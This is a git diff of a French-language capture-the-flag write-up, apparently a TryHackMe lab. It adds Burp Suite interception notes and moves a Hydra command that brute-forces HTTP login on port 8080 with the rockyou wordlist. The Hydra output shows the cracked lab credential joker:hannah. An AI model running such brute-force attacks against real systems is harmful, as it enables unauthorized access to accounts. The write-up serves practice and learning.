@@ -116,9 +116,26 @@ Finished
 
 ## \[Task 2] Bruteforce
 
-<figure><img src=".gitbook/assets/login_8080_joker_hannah.png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/login_8080.png" alt=""><figcaption><p>Ecran de login</p></figcaption></figure>
 
-<figure><img src=".gitbook/assets/burp_joker_password.png" alt=""><figcaption></figcaption></figure>
+Lançons Burp avec "Proxy Interception" sur "on" et entrons "joker" et "password".
+
+<figure><img src=".gitbook/assets/burp_joker_password.png" alt=""><figcaption><p>Ecran de Burp Suite avec essai de login joker:password</p></figcaption></figure>
+
+```sh
+┌──(kali㉿kali)-[~/THM]
+└─$ hydra -l joker -P /usr/share/wordlists/rockyou.txt $IP -s 8080 http-get
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-11 16:35:13
+[WARNING] You must supply the web page as an additional option or via -m, default path set to /
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-get://10.10.56.137:8080/
+[8080][http-get] host: 10.10.56.137   login: joker   password: hannah
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-11 16:35:36
+
+```
 
 ```sh
 ┌──(kali㉿kali)-[~/THM]
@@ -178,21 +195,6 @@ Finished
 + /bin/: This might be interesting.
 + /includes/: This might be interesting.
 + /tmp/: This might be interesting.
-```
-
-```sh
-┌──(kali㉿kali)-[~/THM]
-└─$ hydra -l joker -P /usr/share/wordlists/rockyou.txt $IP -s 8080 http-get
-Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
-
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-11 16:35:13
-[WARNING] You must supply the web page as an additional option or via -m, default path set to /
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
-[DATA] attacking http-get://10.10.56.137:8080/
-[8080][http-get] host: 10.10.56.137   login: joker   password: hannah
-1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-11 16:35:36
-
 ```
 
 ```
